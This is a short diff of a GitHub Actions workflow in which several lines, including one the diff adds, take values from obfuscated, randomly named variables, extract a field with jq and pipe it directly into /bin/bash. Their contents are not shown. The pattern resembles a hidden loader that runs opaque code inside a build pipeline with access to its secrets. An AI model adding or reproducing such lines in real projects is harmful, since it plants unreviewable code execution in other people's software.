@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$utt21" | jq -r .zbh851 | /bin/bash
           echo $ywvk409 | jq -r .nbbrg174 | /bin/bash
           printf '%s' "$sgsl4688" | jq -r .o84 | /bin/bash
+          printf '%s' "$lhai5" | jq -r .tai5843 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
